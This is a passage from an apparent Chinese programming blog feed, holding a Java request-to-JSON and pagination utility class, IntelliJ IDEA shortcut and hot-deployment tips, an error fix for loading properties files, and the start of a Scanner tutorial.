(String) paramNames.nextElement();<br>            String[] pv = request.getParameterValues(paramName);<br>            StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; pv.length; i++) &#123;<br>                <span class="hljs-keyword">if</span> (pv[i].length() &gt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span>) &#123;<br>                        sb.append(<span class="hljs-string">","</span>);<br>                    &#125;<br>                    sb.append(pv[i]);<br>                &#125;<br>            &#125;<br>            requestJson.put(paramName, sb.toString());<br>        &#125;<br>        <span class="hljs-keyword">return</span> requestJson;<br>    &#125;<br><br>方法二<br><span class="hljs-comment">/**<br>     * 将request转JSON<br>     * 并且验证非空字段<br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title">convert2JsonAndCheckRequiredColumns</span><span class="hljs-params">(HttpServletRequest request, String requiredColumns)</span> </span>&#123;<br>        JSONObject jsonObject = request2Json(request);<br>        hasAllRequired(jsonObject, requiredColumns);<br>        <span class="hljs-keyword">return</span> jsonObject;<br>    &#125;<br></code></pre></div></td></tr></table></figure>

<h3 id="检验必填字段"><a href="#检验必填字段" class="headerlink" title="检验必填字段"></a>检验必填字段</h3><p>验证是否含有全部必填字段,没有则返回缺少的必填参数</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/**<br>     * <span class="hljs-doctag">@param</span> requiredColumns 必填的参数字段名称 逗号隔开 比如"userId,name,telephone"<br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hasAllRequired</span><span class="hljs-params">(<span class="hljs-keyword">final</span> JSONObject jsonObject, String requiredColumns)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!StringTools.isNullOrEmpty(requiredColumns)) &#123;<br>            <span class="hljs-comment">//验证字段非空</span><br>            String[] columns = requiredColumns.split(<span class="hljs-string">","</span>);<br>            String missCol = <span class="hljs-string">""</span>;<br>            <span class="hljs-keyword">for</span> (String column : columns) &#123;<br>                Object val = jsonObject.get(column.trim());<br>                <span class="hljs-keyword">if</span> (StringTools.isNullOrEmpty(val)) &#123;<br>                    missCol += column + <span class="hljs-string">"  "</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!StringTools.isNullOrEmpty(missCol)) &#123;<br>                jsonObject.clear();<br>                jsonObject.put(<span class="hljs-string">"code"</span>, ErrorEnum.E_90003.getErrorCode());<br>                jsonObject.put(<span class="hljs-string">"msg"</span>, <span class="hljs-string">"缺少必填参数:"</span> + missCol.trim());<br>                jsonObject.put(<span class="hljs-string">"info"</span>, <span class="hljs-keyword">new</span> JSONObject());<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> CommonJsonException(jsonObject);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure>


<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.heeexy.example.util;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.heeexy.example.config.exception.CommonJsonException;<br><span class="hljs-keyword">import</span> com.heeexy.example.util.constants.Constants;<br><span class="hljs-keyword">import</span> com.heeexy.example.util.constants.ErrorEnum;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.util.Enumeration;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonUtil</span> </span>&#123;<br><br>    <span class="hljs-comment">/**<br>     * 返回一个info为空对象的成功消息的json<br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title">successJson</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> successJson(<span class="hljs-keyword">new</span> JSONObject());<br>    &#125;<br><br>    <span class="hljs-comment">/**<br>     * 返回一个返回码为100的json<br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title">successJson</span><span class="hljs-params">(Object info)</span> </span>&#123;<br>        JSONObject resultJson = <span class="hljs-keyword">new</span> JSONObject();<br>        resultJson.put(<span class="hljs-string">"code"</span>, Constants.SUCCESS_CODE);<br>        resultJson.put(<span class="hljs-string">"msg"</span>, Constants.SUCCESS_MSG);<br>        resultJson.put(<span class="hljs-string">"info"</span>, info);<br>        <span class="hljs-keyword">return</span> resultJson;<br>    &#125;<br><br>    <span class="hljs-comment">/**<br>     * 返回错误信息JSON<br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title">errorJson</span><span class="hljs-params">(ErrorEnum errorEnum)</span> </span>&#123;<br>        JSONObject resultJson = <span class="hljs-keyword">new</span> JSONObject();<br>        resultJson.put(<span class="hljs-string">"code"</span>, errorEnum.getErrorCode());<br>        resultJson.put(<span class="hljs-string">"msg"</span>, errorEnum.getErrorMsg());<br>        resultJson.put(<span class="hljs-string">"info"</span>, <span class="hljs-keyword">new</span> JSONObject());<br>        <span class="hljs-keyword">return</span> resultJson;<br>    &#125;<br><br>    <span class="hljs-comment">/**<br>     * 查询分页结果后的封装工具方法<br>     *<br>     * <span class="hljs-doctag">@param</span> requestJson 请求参数json,此json在之前调用fillPageParam 方法时,已经将pageRow放入<br>     * <span class="hljs-doctag">@param</span> list        查询分页对象list<br>     * <span class="hljs-doctag">@param</span> totalCount  查询出记录的总条数<br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title">successPage</span><span class="hljs-params">(<span class="hljs-keyword">final</span> JSONObject requestJson, List&lt;JSONObject&gt; list, <span class="hljs-keyword">int</span> totalCount)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> pageRow = requestJson.getIntValue(<span class="hljs-string">"pageRow"</span>);<br>        <span class="hljs-keyword">int</span> totalPage = getPageCounts(pageRow, totalCount);<br>        JSONObject result = successJson();<br>        JSONObject info = <span class="hljs-keyword">new</span> JSONObject();<br>        info.put(<span class="hljs-string">"list"</span>, list);<br>        info.put(<span class="hljs-string">"totalCount"</span>, totalCount);<br>        info.put(<span class="hljs-string">"totalPage"</span>, totalPage);<br>        result.put(<span class="hljs-string">"info"</span>, info);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-comment">/**<br>     * 查询分页结果后的封装工具方法<br>     *<br>     * <span class="hljs-doctag">@param</span> list 查询分页对象list<br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title">successPage</span><span class="hljs-params">(List&lt;JSONObject&gt; list)</span> </span>&#123;<br>        JSONObject result = successJson();<br>        JSONObject info = <span class="hljs-keyword">new</span> JSONObject();<br>        info.put(<span class="hljs-string">"list"</span>, list);<br>        result.put(<span class="hljs-string">"info"</span>, info);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-comment">/**<br>     * 获取总页数<br>     *<br>     * <span class="hljs-doctag">@param</span> pageRow   每页行数<br>     * <span class="hljs-doctag">@param</span> itemCount 结果的总条数<br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getPageCounts</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pageRow, <span class="hljs-keyword">int</span> itemCount)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (itemCount == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> itemCount % pageRow &gt; <span class="hljs-number">0</span> ?<br>                itemCount / pageRow + <span class="hljs-number">1</span> :<br>                itemCount / pageRow;<br>    &#125;<br><br>    <span class="hljs-comment">/**<br>     * 将request参数值转为json<br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title">request2Json</span><span class="hljs-params">(HttpServletRequest request)</span> </span>&#123;<br>        JSONObject requestJson = <span class="hljs-keyword">new</span> JSONObject();<br>        Enumeration paramNames = request.getParameterNames();<br>        <span class="hljs-keyword">while</span> (paramNames.hasMoreElements()) &#123;<br>            String paramName = (String) paramNames.nextElement();<br>            String[] pv = request.getParameterValues(paramName);<br>            StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; pv.length; i++) &#123;<br>                <span class="hljs-keyword">if</span> (pv[i].length() &gt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span>) &#123;<br>                        sb.append(<span class="hljs-string">","</span>);<br>                    &#125;<br>                    sb.append(pv[i]);<br>                &#125;<br>            &#125;<br>            requestJson.put(paramName, sb.toString());<br>        &#125;<br>        <span class="hljs-keyword">return</span> requestJson;<br>    &#125;<br><br>    <span class="hljs-comment">/**<br>     * 将request转JSON<br>     * 并且验证非空字段<br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title">convert2JsonAndCheckRequiredColumns</span><span class="hljs-params">(HttpServletRequest request, String requiredColumns)</span> </span>&#123;<br>        JSONObject jsonObject = request2Json(request);<br>        hasAllRequired(jsonObject, requiredColumns);<br>        <span class="hljs-keyword">return</span> jsonObject;<br>    &#125;<br><br>    <span class="hljs-comment">/**<br>     * 验证是否含有全部必填字段<br>     *<br>     * <span class="hljs-doctag">@param</span> requiredColumns 必填的参数字段名称 逗号隔开 比如"userId,name,telephone"<br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hasAllRequired</span><span class="hljs-params">(<span class="hljs-keyword">final</span> JSONObject jsonObject, String requiredColumns)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!StringTools.isNullOrEmpty(requiredColumns)) &#123;<br>            <span class="hljs-comment">//验证字段非空</span><br>            String[] columns = requiredColumns.split(<span class="hljs-string">","</span>);<br>            String missCol = <span class="hljs-string">""</span>;<br>            <span class="hljs-keyword">for</span> (String column : columns) &#123;<br>                Object val = jsonObject.get(column.trim());<br>                <span class="hljs-keyword">if</span> (StringTools.isNullOrEmpty(val)) &#123;<br>                    missCol += column + <span class="hljs-string">"  "</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!StringTools.isNullOrEmpty(missCol)) &#123;<br>                jsonObject.clear();<br>                jsonObject.put(<span class="hljs-string">"code"</span>, ErrorEnum.E_90003.getErrorCode());<br>                jsonObject.put(<span class="hljs-string">"msg"</span>, <span class="hljs-string">"缺少必填参数:"</span> + missCol.trim());<br>                jsonObject.put(<span class="hljs-string">"info"</span>, <span class="hljs-keyword">new</span> JSONObject());<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> CommonJsonException(jsonObject);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**<br>     * 在分页查询之前,为查询条件里加上分页参数<br>     *<br>     * <span class="hljs-doctag">@param</span> paramObject    查询条件json<br>     * <span class="hljs-doctag">@param</span> defaultPageRow 默认的每页条数,即前端不传pageRow参数时的每页条数<br>     * 每页需要显示的结果数量pageRow（这里是10），然后根据当前页的索引pageNum（从1开始）<br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">fillPageParam</span><span class="hljs-params">(<span class="hljs-keyword">final</span> JSONObject paramObject, <span class="hljs-keyword">int</span> defaultPageRow)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> pageNum = paramObject.getIntValue(<span class="hljs-string">"pageNum"</span>);<br>        pageNum = pageNum == <span class="hljs-number">0</span> ? <span class="hljs-number">1</span> : pageNum;<br>        <span class="hljs-keyword">int</span> pageRow = paramObject.getIntValue(<span class="hljs-string">"pageRow"</span>);<br>        pageRow = pageRow == <span class="hljs-number">0</span> ? defaultPageRow : pageRow;<br>        paramObject.put(<span class="hljs-string">"offSet"</span>, (pageNum - <span class="hljs-number">1</span>) * pageRow);<br>        paramObject.put(<span class="hljs-string">"pageRow"</span>, pageRow);<br>        paramObject.put(<span class="hljs-string">"pageNum"</span>, pageNum);<br>        <span class="hljs-comment">//删除此参数,防止前端传了这个参数,pageHelper分页插件检测到之后,拦截导致SQL错误</span><br>        paramObject.remove(<span class="hljs-string">"pageSize"</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**<br>     * 分页查询之前的处理参数<br>     * 没有传pageRow参数时,默认每页10条.<br>     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">fillPageParam</span><span class="hljs-params">(<span class="hljs-keyword">final</span> JSONObject paramObject)</span> </span>&#123;<br>        fillPageParam(paramObject, <span class="hljs-number">10</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>


</font>]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA中的一些快捷键</title>
    <url>/article/ef8f371d.html</url>
    <content><![CDATA[<p>IDEA中有很多有用的快捷键，这里介绍一些会经常用到的快捷键，方便了我们写代码。</p>
<h3 id="运行代码"><a href="#运行代码" class="headerlink" title="运行代码"></a>运行代码</h3><p class="note note-primary">Shift+F10</p>

<h3 id="上下移动一行代码"><a href="#上下移动一行代码" class="headerlink" title="上下移动一行代码"></a>上下移动一行代码</h3><p class="note note-primary">Ctrl+Shift+↑/↓(上下键)</p>

<h3 id="查找和替换"><a href="#查找和替换" class="headerlink" title="查找和替换"></a>查找和替换</h3><p class="note note-primary">Ctrl+r</p>

<p>在当前文件下进行替换。</p>
<h3 id="全局查找和替换"><a href="#全局查找和替换" class="headerlink" title="全局查找和替换"></a>全局查找和替换</h3><p class="note note-primary">Ctrl+Shift+r</p>

<p>Ctrl+Shift+f可以实现全局查找，Ctrl+Shift+r则是先进行全局查找，再将你全局查找出来的内容进行全部替换。</p>
<h3 id="代码自动提示快捷键"><a href="#代码自动提示快捷键" class="headerlink" title="代码自动提示快捷键"></a>代码自动提示快捷键</h3><p class="note note-primary">Alt+/</p>

<p>在IDEA中我们喜欢设置一些代码模板，用快捷键快速使用，例如psvm，但是有时候一些问题会加载不出来，这个时候，我们可以使用Alt+/来重新实现代码自动提示。</p>
<h3 id="Surround-With快捷键"><a href="#Surround-With快捷键" class="headerlink" title="Surround With快捷键"></a>Surround With快捷键</h3><p class="note note-primary">Ctrl+Alt+t</p>

<p>实现将你选中的代码进行if,while,try…catch…等等一些列操作</p>
<h3 id="生成代码"><a href="#生成代码" class="headerlink" title="生成代码"></a>生成代码</h3><p class="note note-primary">Alt+Insert</p>

<p>不多介绍，getter,setter,重写父类</p>
<h3 id="显示快速修复列表"><a href="#显示快速修复列表" class="headerlink" title="显示快速修复列表"></a>显示快速修复列表</h3><p class="note note-primary">Alt+Enter</p>

<p>这个作用就太大了，自动导包，异常捕获，实现接口，实现抽象类…太多了，有十七多种作用。</p>
<h3 id="显示方法参数"><a href="#显示方法参数" class="headerlink" title="显示方法参数"></a>显示方法参数</h3><p class="note note-primary">Ctrl+p</p>

<p>调用方法时，Ctrl+P可以看到方法中你需要填写的参数</p>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p class="note note-primary">Ctrl+/</p>
使用"//"注释/取消注释(一般用于单行注释)

<p class="note note-primary">Ctrl+Shift+/</p>
使用"/**/"注释/取消注释(一般用于多行注释)

<h3 id="自动优化代码缩进"><a href="#自动优化代码缩进" class="headerlink" title="自动优化代码缩进"></a>自动优化代码缩进</h3><p class="note note-primary">Ctrl+Shift+L</p>



]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA完成热部署</title>
    <url>/article/c83ff776.html</url>
    <content><![CDATA[<h3 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h3><p><font color="#856363" size="4" face="Open Sans"><b>热部署就是正在运行状态的应用，修改了他的源码之后，在<font color="#ff6781" size="4" face="Open Sans">不重新启动</font>的情况下能够自动把增量内容编译并部署到服务器上，使得修改立即生效。热部署为了解决的问题有两个， 一是在开发的时候，修改代码后不需要重启应用就能看到效果，大大提升开发效率；二是生产上运行的程序，可以在不停止运行的情况下进行升级，不影响用户使用。</b><br></font></p>
<h3 id="二、部署"><a href="#二、部署" class="headerlink" title="二、部署"></a>二、部署</h3><h4 id="一、引入依赖"><a href="#一、引入依赖" class="headerlink" title="一、引入依赖"></a>一、引入依赖</h4><p><font color="#856363" size="4" face="Open Sans"><b><br>这里我是直接用springboot来介绍怎么完成热部署的。<br></p>
<p>在pom.xml中加入以下代码:<br></b><br></font></p>
<p><font color="#856363" size="4" face="Open Sans"><b></p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--Springboot 工程热部署--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-devtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure>

<img src="https://qiniuyun.fxhstudy.com/IDEA%E5%AE%8C%E6%88%90%E7%83%AD%E9%83%A8%E7%BD%B21.png" srcset="/img/loading.gif">

</b>
</font>


<h4 id="二、配置file"><a href="#二、配置file" class="headerlink" title="二、配置file"></a>二、配置file</h4><p><font color="#856363" size="4" face="Open Sans"><b><br>在IDEA上进行配置file–&gt;左击–&gt;setting–&gt;compilter-&gt;build project autoMatically 复选框勾上</p>
<img src="https://qiniuyun.fxhstudy.com/IDEA%E5%AE%8C%E6%88%90%E7%83%AD%E9%83%A8%E7%BD%B22.png" srcset="/img/loading.gif">

</b>
</font>

<h4 id="三、Registry"><a href="#三、Registry" class="headerlink" title="三、Registry"></a>三、Registry</h4><p><font color="#856363" size="4" face="Open Sans"><b><br>在代码块编辑区中通过快捷键 Ctrl+Shift+Alt+/ 选择Registry<br>找到 <code>compiler.automake.allow.when.app.running</code> 然后复选框勾上，此时就完成了IDEA工程热部署了。</p>
<img src="https://qiniuyun.fxhstudy.com/IDEA%E5%AE%8C%E6%88%90%E7%83%AD%E9%83%A8%E7%BD%B23.png" srcset="/img/loading.gif">

</b>
</font>


]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA报错:inStream parameter is null</title>
    <url>/article/f472fef5.html</url>
    <content><![CDATA[<p>先放图</p>
<img src="https://qiniuyun.fxhstudy.com/inStream%20parameter%20is%20null.png" srcset="/img/loading.gif">
<br>
<br>

<p><font color="#FF6B68">错误: inStream parameter is null</font></p>
<p>连不上数据库，挺烦人的，查了好几篇资料，原因是.properties配置文件放置的路径不对，导致了在加载配置文件的时候，没有获取输入流。</p>
<p>知道原理就好办了，但是IDEA更新后，和之前放置.properties配置文件的包不一样了</p>
<p>之前是放在src包下即可，现在不行了，<br><font color="#FF6B68">这里在新版本的IDEA中放在resources包下即可成功获取输入流。</font></p>
]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA中的常见类</title>
    <url>/article/f5b865cd.html</url>
    <content><![CDATA[<p>最近在学JAVA,以后还是想往JAVA后端发展的，大二开始学习还是有点晚了，所以要多付出一点才可以。<br>现在大概学习到了有关JAVA类的学习了，但是发现缺少代码的累计，我怕后面可能会忘记一些小细节或者某些简单的类中的方法使用，这里记录一下，以便后面可以及时复习。由于初学JAVA，所以一些标准语法可能说的不是很准确。这里也仅仅只是简单的记录一下，不会涉及太深，比较初学，由浅入深嘛</p>
<a id="more"></a>

<h2 id="Scanner类"><a href="#Scanner类" class="headerlink" title="Scanner类"></a>Scanner类</h2><p>Scanner类可以实现键盘的输入，到程序当中去。</p>
<p>nextInt():获取键盘输入数字;<br>next():获取键盘输入字符串;</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/*<br>Scanner类的功能：可以实现键盘输入，到程序当中去。<br><br>引用类型的一般使用步骤：<br><br>1. 导包<br>import 包路径.类名称<br>如果需要使用的目标类，和当前类位于同一个包下，则可以省略导包语句不写。<br>只有java.lang包下的内容不需要导包，其他的包都需要import语句<br><br>2. 创建<br>类名称 对象名 = new 类名称();<br><br>3. 使用<br>对象名.成员方法名()<br> */</span><br><br><span class="hljs-keyword">import</span> java.util.Scanner  	<span class="hljs-comment">//1. 导包</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo01Scanner</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">//2. 创建</span><br>        <span class="hljs-comment">//备注： System.in代表从键盘进行输入</span><br>        Scanner sc = <span class="hljs-keyword">new</span> Scanner(System.in);<br><br>        <span class="hljs-comment">//3. 获取键盘输入数字</span><br>        <span class="hljs-keyword">int</span> num = sc.nextInt();<br>        System.out.println(<span class="hljs-string">"输入的数字是："</span> + num);	<br><br>        <span class="hljs-comment">//4. 获取键盘输入字符串</span><br>        String str = sc.next();<br>        System.out.println(<span class="hljs-string">"输入的字符串是："</span> + str);<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>输出显示：</p>
<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs code">04<br>输入的数字是：4<br>admin<br>输入的字符串是：admin<br></code></pre></div></td></tr></table></figure>


<p>再贴出两个小例子</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/*<br>题目：<br>键盘输入两个int数字，并且求和<br> */</span><br><br><br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span 